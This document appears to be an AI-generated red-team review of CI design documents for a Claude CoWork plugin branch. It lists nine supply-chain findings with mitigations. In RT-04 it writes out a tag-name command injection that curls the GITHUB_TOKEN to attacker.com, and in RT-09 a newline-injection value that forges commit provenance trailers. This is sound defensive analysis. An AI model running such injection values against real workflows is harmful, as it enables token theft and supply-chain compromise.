# Red Team Analysis: PROJ-031 CoWork Skeleton — Phase 1 Deliverables

**Strategy:** S-001 Red Team Analysis
**Deliverables:**
- `projects/PROJ-031-cowork-skeleton/requirements/phase1-requirements.md`
- `projects/PROJ-031-cowork-skeleton/decisions/ADR-001-skeleton-derived-branch-strategy.md`
- `projects/PROJ-031-cowork-skeleton/decisions/ADR-002-ci-token-push-strategy.md`
**Criticality:** C4
**Date:** 2026-06-26
**Reviewer:** jerry:adv-executor (S-001 Red Team Analysis)
**H-16 Compliance:** S-003 Steelman applied; output present at `adversary/iteration-001/s-003-steelman-findings.md` (confirmed)
**Threat Actor:** Repository contributor with write access or compromised CI environment; goal is to inject malicious content into `cowork-skeleton` that users install as a Claude CoWork plugin and execute with AI-assistant-level trust, or to deny plugin installability entirely; motivated by supply-chain compromise, credential theft, and disruption of Jerry distribution.

---

## Document Sections

| Section | Purpose |
|---------|---------|
| [Threat Actor Profile](#threat-actor-profile) | Goals, capabilities, motivation |
| [Findings Summary](#findings-summary) | All findings by severity |
| [Detailed Findings](#detailed-findings) | Attack vector, defense gap, countermeasure per finding |
| [Defense Gap Assessment](#defense-gap-assessment) | Prioritization matrix |
| [Scoring Impact](#scoring-impact) | Dimension-level impact table |
| [Overall Assessment](#overall-assessment) | Remediation guidance |
| [Execution Statistics](#execution-statistics) | Protocol completion |

---

## Threat Actor Profile

| Field | Value |
|-------|-------|
| **Goal** | (a) PRIMARY: inject malicious content into `cowork-skeleton` that users trust-install as a Claude CoWork plugin, gaining code execution within the AI assistant context. (b) SECONDARY: deny plugin installability by invalidating R-001 assumption or exhausting CoWork's git timeout. |
| **Capability** | Repository collaborator with `write` permission to `geekatron/jerry`; CI/CD operator knowledge; understanding of GitHub Actions trust boundaries and git object model; ability to create tags and push branches. |
| **Motivation** | Access to AI assistant tool context gives the attacker the ability to intercept Claude sessions, exfiltrate secrets read by Claude tools, modify Jerry behavior rules, or install persistent backdoors in the skills/agents loaded at session start. The trust delta between a CoWork plugin and a typical npm package is extremely high — users install it by name and never inspect its content. |

---

## Findings Summary

| ID | Severity | Finding | Target Section |
|----|----------|---------|----------------|
| RT-01 | **Critical** | Unprotected `cowork-skeleton` allows any repo write-access actor to push malicious content directly, bypassing CI entirely; users install attacker-controlled code as an AI plugin | ADR-002 §Branch-Protection Posture; REQ-021 |
| RT-02 | **Critical** | Zero user-side verification mechanism; ADR-001 explicitly prohibits commit signing; users cannot detect tampered installs after forced branch update | ADR-001 §Regeneration Commit Determinism; ADR-001 §Consequences |
| RT-03 | **Major** | Generation script (`scripts/generate-cowork-skeleton.sh`) executes in CI runner with `GITHUB_TOKEN` present; integrity is bounded only by write access to `main`, not by any independent pin; SHA-pinning (REQ-017) covers only external Actions, not the repo-internal script | REQ-017; ADR-001 §Decision; ADR-002 §Loop-Safety Argument |
| RT-04 | **Major** | `github.ref_name` (tag name) used to construct the commit message in the generation script without mandatory sanitization; crafted tag names enable workflow injection (shell metacharacters, newline injection into commit-message provenance trailers) | REQ-008; ADR-001 §Regeneration Commit Determinism |
| RT-05 | **Major** | REQ-022 supply-chain equivalence check is specified as a post-push verification ("after each CI run"), not an in-workflow pre-push automated gate; temporal window between branch update and verification allows tampered content to reach users | REQ-022 Acceptance Criterion; ADR-001 §Consequences Positive #1 |
| RT-06 | **Major** | R-001 critical assumption has no hard automated gate preventing Phase 5 from proceeding; the only enforcement is process-only ("MUST be empirically verified before Phase 5 begins"), with no CI gate, ticket block, or automated gate mechanism | R-001; REQ-001; ADR-001 §L2 Architectural Implications #4 |
| RT-07 | **Major** | `fetch-depth: 0` full-history clone for provenance makes CoWork's 120-second git-operation timeout reachable through history inflation; an attacker with `main` write access can push large binary blobs to inflate clone time until plugin becomes uninstallable | ADR-001 §Consequences Negative #1; ADR-001 §Options Considered §Option B |
| RT-08 | **Minor** | `concurrency: cancel-in-progress: false` serializes but does not guarantee FIFO execution order for rapid sequential `v*` tag pushes; a queued older-tag run completing after a newer-tag run overwrites the skeleton with stale content | REQ-015; REQ-018; ADR-001 §Regeneration Commit Determinism |
| RT-09 | **Minor** | No restriction on tag name character set; a tag containing newlines (`v1.0.0\nSource-Tag: v-evil`) poisons the commit message provenance trailers used by REQ-008, making the commit message attestation untrustworthy for downstream tooling | REQ-008; ADR-001 §Regeneration Commit Determinism §Commit message template |

---

## Detailed Findings

---

### RT-01: Unprotected Branch Permits Direct Malicious Write — AI Plugin Trust Boundary Violated

| Attribute | Value |
|-----------|-------|
| **Severity** | Critical |
| **Section** | ADR-002 §Branch-Protection Posture; REQ-021 |
| **Strategy Step** | Step 2 (Attack Vector: Boundary Violation) + Step 3 (Defense Gap: Missing) |

**Evidence:**

ADR-002 §Branch-Protection Posture:
> "Recommended posture: `cowork-skeleton` is UNPROTECTED, exactly like `gh-pages`."
> "Protection adds force-push friction (requiring a bypass actor) while protecting nothing — there is no human work on the branch to guard."

REQ-021:
> "The `cowork-skeleton` branch SHALL be configured as a CI-owned, unprotected branch mirroring the `gh-pages` posture: no branch protection rules, no required status checks, regenerated wholesale on each release."

REQ-021 Acceptance Criterion:
> "`gh api repos/geekatron/jerry/branches/cowork-skeleton/protection` returns HTTP 404 (no protection configured)."

**Analysis:**

The design intentionally leaves `cowork-skeleton` unprotected and explicitly verifies this with an HTTP 404 on branch protection. The `gh-pages` parity argument is structurally unsound from an adversarial perspective: `gh-pages` serves documentation rendered in a browser with its security sandbox; `cowork-skeleton` serves code that CoWork clones and loads into the AI assistant's context, where it runs with user-level trust in Claude sessions. The threat impact is categorically different.

Any actor with repository write access (collaborators, anyone with push access granted during development) can push arbitrary content directly to `cowork-skeleton` at any time between CI runs. This bypasses REQ-022 entirely (equivalence is CI-internal; a direct push triggers no CI check). The branch is force-pushed by design (ADR-001), so a direct-push attacker overwrites the last good CI state without any trace in branch protection audit logs (because there are none). Users who subsequently run `claude plugin marketplace add geekatron/jerry@cowork-skeleton` install the attacker's content, receiving it as the trusted Jerry plugin.

The risk entry R-007 in the requirements acknowledges supply-chain compromise risk for a "compromised CI" scenario but does not address the simpler vector: a contributor with repository write access making a direct push to the unprotected branch.

**Recommendation:**

Introduce a branch protection ruleset on `cowork-skeleton` that:
1. Allows **only** the `github-actions[bot]` (or a named GitHub App) as a bypass actor for force-push — blocking all human direct writes
2. Denies all non-bypass push including force-push for every other actor
3. Documents this ruleset in STORY-005 / `branch-protection-config.md`

This does NOT require switching from `GITHUB_TOKEN` to a GitHub App (ADR-002 provides the ruleset bypass option for `GITHUB_TOKEN` with `github-actions[bot]` as bypass actor). The unprotected posture should remain only for `gh-pages`, which has no code-execution trust implication.

---

### RT-02: No User-Verifiable Install Integrity — Tampered Skeleton Is Undetectable

| Attribute | Value |
|-----------|-------|
| **Severity** | Critical |
| **Section** | ADR-001 §Regeneration Commit Determinism; ADR-001 §Consequences |
| **Strategy Step** | Step 2 (Attack Vector: Dependency Attack on Trust Chain) + Step 3 (Defense Gap: Missing) |

**Evidence:**

ADR-001 §Regeneration Commit Determinism §Signature:
> "**Signature: unsigned** (or deterministically signed) — A timestamped GPG signature would vary per run and break the bit-identical SHA. Do not sign the regeneration commit."

ADR-001 §Consequences Positive #1:
> "Auditable provenance — the skeleton commit's parent is the exact `v*` release commit; `git log` and `diff against main` work, supporting the C4 supply-chain narrative."

REQ-026:
> "The Tutorial SHALL instruct users to install the marketplace via the Git-based command `claude plugin marketplace add geekatron/jerry@cowork-skeleton`"

**Analysis:**

The phrase "auditable provenance" in ADR-001 describes provenance auditable by maintainers who actively inspect the git log — not by users who run `claude plugin marketplace add geekatron/jerry@cowork-skeleton`. After installation, the user has no mechanism to verify that the installed plugin content matches any expected release:

1. CoWork's plugin installation UI does not surface the commit SHA, commit message, or parent chain to the user
2. Commit signing is explicitly prohibited by ADR-001 (correctly for bit-idempotency, but this removes the only standard user-verifiable integrity mechanism)
3. There is no SBOM, no Sigstore/Cosign attestation, no CycloneDX manifest, no checksum published alongside the release
4. The force-push model means each install always reflects whatever SHA the branch currently points to — the user cannot pin to a specific verified state

An attacker who successfully modifies `cowork-skeleton` (via RT-01 direct push, RT-03 script compromise, or CI environment compromise) produces content that users install with no visual warning, no integrity failure, and no detectable difference from a legitimate install. Since the plugin is loaded into Claude's context at session start (`.claude-plugin/`, `skills/`, `.context/`), malicious skill definitions or hook files would execute silently in every subsequent session.

The ADR frames provenance as a positive consequence of Option A over Option B. It is provenance for the maintainer's audit trail, not for the user's install-time trust decision.

**Recommendation:**

1. Generate a SHA-256 checksum manifest of the `cowork-skeleton` working tree at CI run time and publish it as a release asset alongside each `v*` release (no signing required — the release asset is published via `GITHUB_TOKEN` from the same verified CI job)
2. Publish the `cowork-skeleton` commit SHA in the GitHub Release notes for each `v*` tag so users can compare with `git ls-remote origin cowork-skeleton`
3. Consider Sigstore/Cosign `blob sign` for the manifest (uses ephemeral OIDC identity, not a GPG key, so no long-lived secret and no idempotency impact)
4. Add a post-install verification command to the Tutorial (REQ-026) that lets users confirm the installed commit SHA matches the published release value

---

### RT-03: Generation Script Integrity Not Pinned — Repo Write Access Enables CI-Mediated Branch Compromise

| Attribute | Value |
|-----------|-------|
| **Severity** | Major |
| **Section** | REQ-017; ADR-001 §Decision; ADR-002 §Loop-Safety Argument |
| **Strategy Step** | Step 2 (Attack Vector: Dependency Attack via PPE) + Step 3 (Defense Gap: Partial) |

**Evidence:**

REQ-017:
> "All GitHub Actions referenced in `cowork-skeleton.yml` SHALL be pinned to their full 40-character commit SHA and SHALL NOT reference mutable tag aliases such as `@v4`."

ADR-001 §Decision:
> "We will use Option A: generate `cowork-skeleton` by checking out the triggering `v*` tag, running `git rm -r projects/`, writing the fixed `projects/` stub..."

ADR-002 §Decision:
> "We will use Option A: the built-in `GITHUB_TOKEN` with a minimal, job- or workflow-level permissions block"

**Analysis:**

REQ-017 correctly SHA-pins all external GitHub Actions, closing the supply-chain attack surface on third-party actions. However, the generation script (`scripts/generate-cowork-skeleton.sh`) is a repo-internal artifact that:

1. Is checked out from the triggering `v*` tag (so the script's content is whatever was on `main` when the tag was created)
2. Executes with `GITHUB_TOKEN` (`contents: write`) available in the environment
3. Has no independent integrity pin separate from the tag's SHA — the only protection is "the tag should come from an honest `main`"

The attack path: an attacker with repository write access modifies `scripts/generate-cowork-skeleton.sh` to (a) push arbitrary content to `cowork-skeleton` instead of the legitimate stripped tree, (b) exfiltrate `GITHUB_TOKEN` during the job window, or (c) commit additional files. They then push a `v*` tag. The workflow runs the malicious script with `contents: write` permission. REQ-019 (no secrets in logs) covers logging, but does not prevent exfiltration via outbound HTTP calls from the runner. The SHA-pinning of Actions (REQ-017) is not relevant — no external Action is involved; the attack is through the repo's own script.

This is a direct Poisoned Pipeline Execution (PPE) via an indirect vector (not requiring CI configuration access, only tag push + prior code commit). The loop-safety argument (ADR-002) is orthogonal — loop safety prevents infinite recursion; it does not prevent a compromised script from pushing arbitrary content on the first run.

**Recommendation:**

1. Add a SHA-pin or content hash assertion for the generation script itself: record the expected SHA-256 hash of `scripts/generate-cowork-skeleton.sh` in a separate verification artifact and validate it in the workflow before execution
2. Alternatively, inline the generation logic directly in the workflow YAML (which IS pinned to the tag checkout) rather than delegating to a detached script — this limits the attack surface to the workflow file itself, which is already SHA-reviewable
3. Require PR review approval on changes to `scripts/generate-cowork-skeleton.sh` and `.github/workflows/cowork-skeleton.yml` via CODEOWNERS (`/scripts/generate-cowork-skeleton.sh @security-reviewers`)
4. Consider adding `ACTIONS_RUNNER_DEBUG` detection and egress filtering in the runner to limit exfiltration surface during the CI job

---

### RT-04: Unsanitized `github.ref_name` in Commit Message Construction — Workflow Injection via Tag Name

| Attribute | Value |
|-----------|-------|
| **Severity** | Major |
| **Section** | REQ-008; ADR-001 §Regeneration Commit Determinism §Commit message template |
| **Strategy Step** | Step 2 (Attack Vector: Ambiguity Exploitation / Injection) + Step 3 (Defense Gap: Missing) |

**Evidence:**

ADR-001 §Regeneration Commit Determinism §Commit message template:
```
build(cowork-skeleton): regenerate from <tag> (<short-sha>)

Strips projects/ for Claude CoWork plugin distribution (~1,744 files).
Source-Tag: <tag>
Source-Commit: <40-char source SHA>
Generated-By: .github/workflows/cowork-skeleton.yml
```

REQ-008:
> "The skeleton generation commit message SHALL embed both the source tag name and the full 40-character source SHA."

**Analysis:**

The `<tag>` placeholder in the commit message template is populated from `github.ref_name`, which is an attacker-controlled untrusted input (any actor with tag-push permission controls the tag name). Two distinct injection attacks are possible:

**Attack A — Shell injection in generation script:**
If the generation script constructs the commit message as a shell string without proper variable quoting:
```bash
git commit -m "build(cowork-skeleton): regenerate from $TAG_NAME ..."
```
or via the `-m` argument constructed from a GitHub Actions expression:
```yaml
run: git commit -m "build(...): regenerate from ${{ github.ref_name }} ..."
```
A tag named `v1$(curl -s http://attacker.com/x?t=$GITHUB_TOKEN)` executes an outbound request with the token. GitHub Actions security guidance explicitly requires untrusted context values to be passed as environment variables rather than embedded inline in `run:` scripts (`env: TAG: ${{ github.ref_name }}` then `git commit -m "... $TAG ..."`). Neither the requirements nor the ADR mandate this sanitization pattern.

**Attack B — Commit message trailer injection:**
The commit message format includes structured trailers (`Source-Tag: <tag>`, `Source-Commit: <sha>`). A tag name containing a newline character (e.g., `v1.0.0\nGenerated-By: attacker-controlled`) injects a spurious trailer, corrupting the provenance record used by downstream tools that parse these trailers (e.g., any tool relying on `git log --format="%B"` to verify `Source-Commit:`).

REQ-008 mandates what is embedded but provides no sanitization or character-set restriction on the tag name. ADR-001's determinism proof does not address this attack surface.

**Recommendation:**

1. Mandate in REQ-008 (or a new security requirement) that the tag name is validated against a strict character set (e.g., `^v[0-9]+\.[0-9]+\.[0-9]+$`) before use, exiting non-zero on violation
2. In the generation script, always pass tag name as an environment variable (never inline in shell command strings): `env: TAG_NAME: ${{ github.ref_name }}` then `git commit -m "build(cowork-skeleton): regenerate from ${TAG_NAME} ..."` with the `TAG_NAME` value shell-quoted
3. Sanitize newlines and control characters from `TAG_NAME` before embedding in the commit message; a simple `echo "${TAG_NAME}" | tr -d '\n\r'` check before use is sufficient

---

### RT-05: REQ-022 Equivalence Verification Is Post-Push, Not Pre-Push — Temporal Gap Exposes Users to Tampered Content

| Attribute | Value |
|-----------|-------|
| **Severity** | Major |
| **Section** | REQ-022 Acceptance Criterion; ADR-001 §Consequences Positive #1 |
| **Strategy Step** | Step 2 (Attack Vector: Degradation / Verification Gap) + Step 3 (Defense Gap: Partial) |

**Evidence:**

REQ-022 Acceptance Criterion:
> "`git diff v{N}..cowork-skeleton -- ':!projects/'` returns zero changed files (only `projects/` is different between the tag and the skeleton). Verified by **Analysis + Demonstration after each CI run**."

ADR-001 §Consequences Positive #1:
> "Auditable provenance — the skeleton commit's parent is the exact `v*` release commit; `git log` and `diff against main` work, supporting the C4 supply-chain narrative."

REQ-019 Acceptance Criterion:
> "Full CI run log review: no token values, credential fragments, or secret variable contents appear in any step output. Verified by **Inspection of run logs**."

**Analysis:**

The phrase "after each CI run" in REQ-022's acceptance criterion is structurally ambiguous: it could mean (a) an automated step within the CI job that asserts equivalence BEFORE the force-push is executed, or (b) a post-hoc manual inspection performed after the CI job completes and the branch has already been pushed.

If interpretation (b) applies (or if interpretation (a) is assumed but never enforced in the implementation), the attack window is:
1. CI job pushes potentially tampered `cowork-skeleton` (whether via script compromise, RT-03, or CI environment injection)
2. An operator runs the diff check and detects the deviation
3. However, between steps 1 and 2, any user who adds or updates the plugin installs the tampered content

Even under interpretation (a), the CI job sequence matters: if the equivalence check runs AFTER `git push --force origin HEAD:cowork-skeleton` instead of BEFORE, the check is non-preventive — it detects but cannot prevent the push.

REQ-019's inspection-based acceptance criterion for log hygiene has the same structural gap: Inspection of run logs is a post-hoc human check, not an in-workflow automated assertion.

**Recommendation:**

1. Add an explicit in-workflow step that PRECEDES the force-push: `git diff --exit-code <tag_sha>..HEAD -- ':!projects/'` where the diff is computed against the in-memory working tree of the runner (before push), not against the remote branch. If this exits non-zero, the workflow fails and no push occurs
2. Rename the acceptance criterion language from "after each CI run" to "in-workflow pre-push assertion, failure causes job to exit non-zero and suppresses the force-push" to eliminate the ambiguity
3. Add a REQ-022 successor requirement in the implementation (STORY-001 / TASK-002) that explicitly places this check as the penultimate step, immediately before `git push --force`

---

### RT-06: R-001 Has No Hard Automated Gate — Process-Only Control Cannot Prevent Phase 5 Proceeding on a False Assumption

| Attribute | Value |
|-----------|-------|
| **Severity** | Major |
| **Section** | R-001 (Requirements §Stated Assumption); ADR-001 §L2 Architectural Implications #4 |
| **Strategy Step** | Step 2 (Attack Vector: Degradation — control erosion over time) + Step 3 (Defense Gap: Partial) |

**Evidence:**

Requirements §R-001:
> "**Criticality: Critical.** If the limit applies to the local working directory rather than the clean-clone tree, branch-stripping has no effect and the strategy must pivot to local-plugin configuration guidance — a scope change requiring user decision before Phase 5."
> "**Verification Approach:** Before Phase 5: (a) attempt to install from the current `main` branch on a clean machine..."

ADR-001 §L2 #4:
> "The strategy's validity rests on an external, still-unverified assumption... This is honestly the top residual risk and is not resolved by this ADR; it is delegated to a mandatory requirements-level acceptance test before Phase 5."

REQ-033:
> "No irreversible POST-APPROVAL action... SHALL be executed until the user has provided explicit approval for each item AG-01 through AG-10."

**Analysis:**

R-001 is acknowledged as the project's most critical residual risk. However, the controls governing it are entirely process-based:
- "MUST be empirically verified before Phase 5 begins" — stated in requirements prose, not enforced by any automated gate
- AG-01 through AG-10 approval gates require user approval for post-approval actions, but R-001 verification is a prerequisite TO the approval gates, not itself gated
- The orchestration plan's phase sequencing relies on human compliance with the verification requirement

From an adversarial perspective, this creates a window for a "time pressure attack" within the project team: if a release deadline creates pressure to begin Phase 5 implementation before R-001 has been empirically verified, the entire implementation effort produces work that must be discarded. More critically, if R-001 is never verified and Phase 5 proceeds, the delivered CI workflow will generate a `cowork-skeleton` branch that fails CoWork installation — silently, from the user's perspective — without any fallback.

The design's fallback ("pivot to local-plugin configuration guidance") is defined at the stakeholder level but has no implementation plan: there is no STORY or TASK for the fallback path, no documented local-configuration procedure, and no rollback workflow if the CI infrastructure has already been built on the false assumption.

**Recommendation:**

1. Create a dedicated STORY-003a (or task within STORY-003): "R-001 Empirical Verification" with a blocking dependency on Phase 5 start in the orchestration plan; mark it as a hard blocker (`blocked_by: [STORY-003a]`) on STORY-001
2. Add an automated CI check (runnable as a `workflow_dispatch` job, separate from the skeleton generator) that performs the clean-clone install test on a fresh runner and exits non-zero if the file limit is hit; run this before Phase 5 sign-off
3. Define and document the fallback implementation plan (local-plugin configuration guidance) as a parallel STORY even if it is not the expected path, so it can be executed without delay if R-001 is falsified

---

### RT-07: `fetch-depth: 0` for Provenance Creates History-Inflation DoA Attack Surface

| Attribute | Value |
|-----------|-------|
| **Severity** | Major |
| **Section** | ADR-001 §Decision (fetch-depth note); ADR-001 §Consequences Negative #1 |
| **Strategy Step** | Step 2 (Attack Vector: Degradation via Dependency Attack on CoWork Timeout) + Step 3 (Defense Gap: Partial) |

**Evidence:**

ADR-001 §Decision correction note:
> "Default to `fetch-depth: 0` to keep Option A's provenance benefit; this is the deliberate clone-weight cost noted above."

ADR-001 §Consequences Negative #1:
> "Clone weight under full provenance — `fetch-depth: 0` carries `main`'s history into the skeleton `.git`; on slow networks this risks CoWork's 120-second git-operation timeout (`CLAUDE_CODE_PLUGIN_GIT_TIMEOUT_MS`). *Mitigation:* Option B (orphan) escape hatch; optional large-blob stripping (R-002)."

ADR-001 §L2 #2:
> "...if and only if clone timing becomes a problem, switching to Option B is a one-line, pre-designed change rather than a redesign."

**Analysis:**

The design correctly identifies clone-weight pressure as a risk (R-002) and documents the Option B orphan-branch escape hatch. However, the risk framing is passive ("if real-world clone timing approaches the timeout") and the mitigation is reactive (switch to Option B only after the problem manifests). This creates an exploitable attack surface:

An attacker with repository write access to `main` can push large binary blobs (e.g., test fixtures, documentation images, synthetic large files) as commits on `main`. Because `cowork-skeleton` carries `main`'s full history (`fetch-depth: 0`), these blobs enter the skeleton's `.git` pack objects even though they are excluded from the working tree. A series of 50 MB commits to `main` adds permanently to the clone weight of `cowork-skeleton`. At some threshold, new users' 120-second CoWork git timeout fires, making the plugin uninstallable — a persistent DoA that cannot be undone without git history rewriting (Option C, already rejected).

The mitigation (Option B orphan) is reactive and requires a documented intentional change. The problem is not just that Option B is "one-line" — it is that Option A + full-history is the DEFAULT, and the threshold at which the timeout is triggered is not bounded or monitored. No alerting mechanism exists to detect clone-weight growth before it crosses the CoW 120-second threshold.

**Recommendation:**

1. Add an explicit CI metric: after generating the skeleton, record `git count-objects -v` (pack size of the skeleton's `.git`) in `$GITHUB_STEP_SUMMARY`; alert if pack size exceeds a threshold (e.g., 100 MB, tunable)
2. Set a concrete pre-defined threshold in the ADR at which Option B (orphan) is automatically selected rather than reactively chosen — e.g., "if total pack size of the generated skeleton's `.git` exceeds 150 MB, the CI job MUST switch to the orphan commit and emit a warning"
3. Consider adding CODEOWNERS review for large binary files committed to `main` to reduce the attacker's ability to inflate history without PR review friction

---

### RT-08: `concurrency: cancel-in-progress: false` Does Not Guarantee FIFO Execution Order

| Attribute | Value |
|-----------|-------|
| **Severity** | Minor |
| **Section** | REQ-015; REQ-018; ADR-001 §Regeneration Commit Determinism |
| **Strategy Step** | Step 2 (Attack Vector: Race Condition / Degradation Path) + Step 3 (Defense Gap: Partial) |

**Evidence:**

REQ-015:
> "The CI workflow SHALL include a `concurrency` group (e.g., `group: cowork-skeleton`, `cancel-in-progress: false`) to serialize overlapping workflow runs."

REQ-018:
> "The CI workflow SHALL be idempotent: executing `workflow_dispatch` for a previously processed `v*` tag SHALL produce an identical `cowork-skeleton` branch state to the initial execution for that tag."

**Analysis:**

`concurrency: cancel-in-progress: false` serializes runs in the same concurrency group, but does not define execution order for queued runs. GitHub Actions queuing is FIFO for most cases, but the guarantee is not documented as strict. When two `v*` tags are pushed in rapid succession (e.g., during a hotfix release, which Jerry's `version-bump.yml` → `release.yml` pipeline can produce), both runs queue. If the queue executes in creation order (v1 → v2), the skeleton ends at v2 (correct). But if the queue delivers v2 first due to runner allocation timing and v1 second, the skeleton ends at v1 after both runs complete — an older skeleton is the live artifact.

This is not a security attack per se, but the adversarial scenario is: an attacker who can influence CI run timing (e.g., via a `workflow_dispatch` invocation targeting an older tag) could force the skeleton to revert to an older release state, even if that state is not itself malicious. The idempotency property (REQ-018, NFR-002) means each individual run is deterministic, but the LAST writer wins in a concurrent scenario, and "last" is not guaranteed to equal "newest tag."

**Recommendation:**

1. Add a version-comparison guard in the generation script: before executing `git push --force`, compare the source tag's semver against the current `cowork-skeleton` commit message's `Source-Tag:` trailer; if the queued run's tag is OLDER, emit a warning and skip the push rather than overwriting a newer skeleton
2. Document this invariant in NFR-002 (idempotency) as an explicit concurrency edge case: "re-running an OLDER tag via `workflow_dispatch` MUST NOT overwrite a skeleton generated from a NEWER tag"

---

### RT-09: Tag Name Character Set Not Validated — Provenance Trailer Injection

| Attribute | Value |
|-----------|-------|
| **Severity** | Minor |
| **Section** | REQ-008; ADR-001 §Regeneration Commit Determinism §Commit message template |
| **Strategy Step** | Step 2 (Attack Vector: Ambiguity Exploitation) + Step 3 (Defense Gap: Missing) |

**Evidence:**

ADR-001 §Regeneration Commit Determinism §Commit message template:
```
build(cowork-skeleton): regenerate from <tag> (<short-sha>)

Strips projects/ for Claude CoWork plugin distribution (~1,744 files).
Source-Tag: <tag>
Source-Commit: <40-char source SHA>
Generated-By: .github/workflows/cowork-skeleton.yml
```

REQ-008:
> "The skeleton generation commit message SHALL embed both the source tag name and the full 40-character source SHA."

**Analysis:**

Git tag names are constrained by `git check-ref-format` but permit many characters including forward slashes, tildes, and (in some configurations) characters that when embedded in a `git commit -m "..."` string can inject additional trailer lines. A tag named `v1.0.0\nSource-Commit: 0000000000000000000000000000000000000000` would produce a commit whose `Source-Commit:` trailer reads as the attacker-supplied value, not the real source commit SHA.

While `github.ref_name` in GitHub Actions may strip some characters, this is not documented as a security guarantee. Downstream tooling that relies on parsing `Source-Commit:` from `git log --format="%B"` to verify provenance (e.g., a supply-chain audit script) would be deceived. Combined with RT-02's lack of user verification, this weakens the provenance attestation that ADR-001 cites as a primary benefit of Option A over Option B.

**Recommendation:**

1. Add a validation step in the generation script that asserts `$TAG_NAME` matches the pattern `^v[0-9]+\.[0-9]+(\.[0-9]+)?(-[a-zA-Z0-9.]+)?$` before use; exit non-zero on mismatch
2. Quote the `TAG_NAME` variable with double-quotes in shell and pass it as an environment variable (not an inline expression) in any `git commit -m` invocation

---

## Defense Gap Assessment

| ID | Severity | Existing Defense | Defense Status | Priority |
|----|----------|-----------------|----------------|----------|
| RT-01 | Critical | "Documentation + branch-protection posture" (REQ-021, ADR-002) | **Missing** (documentation does not block malicious writes; branch is intentionally unprotected by design) | **P0 — MUST mitigate before Phase 5** |
| RT-02 | Critical | Commit message provenance trailers (REQ-008, ADR-001); CI-internal REQ-022 diff check | **Missing** (neither mechanism is user-verifiable at install time; signing explicitly prohibited) | **P0 — MUST mitigate before Phase 5** |
| RT-03 | Major | SHA-pinned external Actions (REQ-017) | **Partial** (covers third-party actions; does not cover repo-internal generation script) | **P1 — SHOULD mitigate** |
| RT-04 | Major | None identified in any deliverable | **Missing** | **P1 — SHOULD mitigate** |
| RT-05 | Major | REQ-022 equivalence requirement; post-run inspection | **Partial** ("after each CI run" is ambiguous about timing; post-push check does not prevent user exposure) | **P1 — SHOULD mitigate** |
| RT-06 | Major | R-001 verbal MUST requirement; approval gates AG-01–AG-10 | **Partial** (process-only; no automated blocking gate; AG gates apply to post-approval actions, not R-001 verification itself) | **P1 — SHOULD mitigate** |
| RT-07 | Major | Option B escape hatch documented; R-002 risk noted | **Partial** (mitigation is reactive, no trigger threshold defined, no monitoring) | **P2 — MAY mitigate; define threshold** |
| RT-08 | Minor | `concurrency: cancel-in-progress: false`; idempotency guarantee per REQ-018 | **Partial** (serializes runs but does not bound execution order) | **P2 — Monitor** |
| RT-09 | Minor | None identified | **Missing** | **P2 — Implement in script** |

---

## Scoring Impact

| S-014 Dimension | Weight | Net Impact | Affected Findings |
|-----------------|--------|------------|-------------------|
| Completeness | 0.20 | **Negative** | RT-02 (missing user verification mechanism), RT-05 (pre-push equivalence check not specified), RT-07 (no monitoring threshold defined) |
| Internal Consistency | 0.20 | **Negative** | RT-01 (gh-pages parity argument applied to code-execution trust context), RT-05 (REQ-022 post-push ambiguity inconsistent with supply-chain integrity claim) |
| Methodological Rigor | 0.20 | **Negative** | RT-04 (no sanitization requirement for untrusted input), RT-06 (process-only gate on the most critical assumption) |
| Evidence Quality | 0.15 | **Neutral** | Design is well-evidenced from first-party sources; evidence quality is high for the chosen options but does not address the gaps identified here |
| Actionability | 0.15 | **Negative** | RT-01 (mitigation documented only for accidental write, not malicious write); RT-06 (R-001 fallback path has no implementation plan) |
| Traceability | 0.10 | **Neutral** | Requirement-to-stakeholder traceability is strong; findings primarily expose gaps at the boundary between traced requirements and threat modeling |

**Estimated composite score impact of unaddressed P0+P1 findings:** approximately -0.12 to -0.18 below a fully-mitigated baseline. Addressing RT-01 and RT-02 (both P0) is expected to recover the largest fraction of this gap.

---

## Overall Assessment

**Assessment: Major Remediation Required on Two Critical Findings (RT-01, RT-02) Before Phase 5**

The Phase 1 deliverables demonstrate strong architectural reasoning, correct token selection (ADR-002), well-formed requirement structure, and clear traceability. The loop-safety three-guarantee argument is sound. The idempotency proof is rigorous. The SHA-pinning of external Actions is good supply-chain hygiene.

However, two Critical findings (RT-01, RT-02) represent fundamental gaps in the supply-chain trust model that cannot be addressed by mitigation at a later phase:

1. **RT-01** must be resolved before implementation: the unprotected branch posture, while operationally convenient, creates a direct-write attack surface for any repository contributor, allowing silent installation of attacker-controlled content as a Claude AI plugin. The fix (branch ruleset with `github-actions[bot]` bypass) is compatible with the `GITHUB_TOKEN` decision in ADR-002.

2. **RT-02** must be resolved before Phase 7 (documentation): without any user-verifiable integrity mechanism, the supply-chain narrative is incomplete regardless of how rigorous the CI pipeline is. The fix (SHA manifest published as release asset, documented in Tutorial) can be added incrementally and does not change the skeleton generation approach.

Four Major findings (RT-03 through RT-06) require mitigation before implementation proceeds but are lower-urgency than the Critical pair. Two Minor findings (RT-08, RT-09) are addressed by single-function additions to the generation script.

---

## Execution Statistics

- **Total Findings:** 9
- **Critical:** 2 (RT-01, RT-02)
- **Major:** 5 (RT-03, RT-04, RT-05, RT-06, RT-07)
- **Minor:** 2 (RT-08, RT-09)
- **Protocol Steps Completed:** 5 of 5
- **H-16 Compliance:** Verified (S-003 steelman output present in `iteration-001/` prior to this execution)

---

*Generated by: jerry:adv-executor (S-001 Red Team Analysis)*
*Strategy template: `.context/templates/adversarial/s-001-red-team.md`*
*Deliverables reviewed: phase1-requirements.md, ADR-001-skeleton-derived-branch-strategy.md, ADR-002-ci-token-push-strategy.md*
*Date: 2026-06-26*
